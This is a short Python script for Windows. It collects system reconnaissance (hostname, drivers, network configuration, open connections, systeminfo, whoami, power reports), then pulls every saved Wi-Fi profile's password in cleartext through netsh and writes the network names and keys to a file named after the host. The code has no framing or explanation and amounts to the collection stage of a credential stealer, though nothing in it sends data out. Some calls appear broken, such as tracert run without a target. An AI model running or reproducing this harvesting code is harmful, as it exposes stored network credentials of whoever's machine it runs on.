import subprocess
machine_name = subprocess.check_output("hostname").decode("utf-8").split("\r\n")[0]
# program = subprocess.check_output(["grep", "-c", "instructions.txt", "instructions.txt"])
drivequery = subprocess.run(["driverquery", "-v"], capture_output=True, text=True, shell=True)
ipconfig = subprocess.run(["ipconfig"], capture_output=True, text=True, shell=True)
netstat = subprocess.run(["netstat", "-am"], capture_output=True, text=True, shell=True)
# ping = subprocess.run(["ping", "-t", "ipaddress"], capture_output=True, text=True, shell=True)
# pathping = subprocess.run(["pathping", "-t", "ipaddress"], capture_output=True, text=True, shell=True)
tracert = subprocess.run(["tracert"], capture_output=True, text=True, shell=True)
powercfg = subprocess.run(["powercfg", "/a"], capture_output=True, text=True, shell=True)
powercfg_devicequery = subprocess.run(["powercfg", "/devicequery", "s1_supported"], capture_output=True, text=True, shell=True)
powercfg_lastwake = subprocess.run(["powercfg", "/lastwake"], capture_output=True, text=True, shell=True)
# powercfg_energy = subprocess.run(["powercfg", "/energy"], capture_output=True, text=True, shell=True)
powercfg_batteryReport = subprocess.run(["powercfg", "/batteryreport"], capture_output=True, text=True, shell=True)
systemInfo = subprocess.run(["systeminfo", "/s", machine_name], capture_output=True, text=True, shell=True)
# which = subprocess.run(["which", "git"], capture_output=True, text=True, shell=True)
whoami = subprocess.run(["whoami"], capture_output=True, text=True, shell=True, )

print(powercfg_batteryReport)


#print(drivequery)
data = subprocess.check_output(["netsh", "wlan", "show", "profiles"]).decode("utf-8").split("\n")
wifis = [line.split(":")[1][1:-1] for line in data if "All User Profile" in line]
file = open(f"{machine_name}.txt", "a")
file2 = open(f"{machine_name}_not_found.txt", "a")
try:
    for wifi in wifis:
        results = subprocess.check_output(["netsh", "wlan", "show", "profile", wifi, "key=clear"]).decode("utf-8").split("\n")
        results = [line.split(":")[1][1:-1] for line in results if "Key Content" in line]
        try:
            # print(f"Wifi name: {wifi}\nPassword: {results[0]}")
            file.write(f"Wifi name: {wifi}\nPassword: {results[0]}\n")
        except IndexError:
            # print(f"Wifi name: {wifi}\nPassword: Not found")
            file2.write(f"Wifi name: {wifi}\nPassword: Not found\n")
except Exception as e:
    # print(wifi, "is causing an error\n", e)
    file2.write(f"{wifi} is causing an error\n {e}")

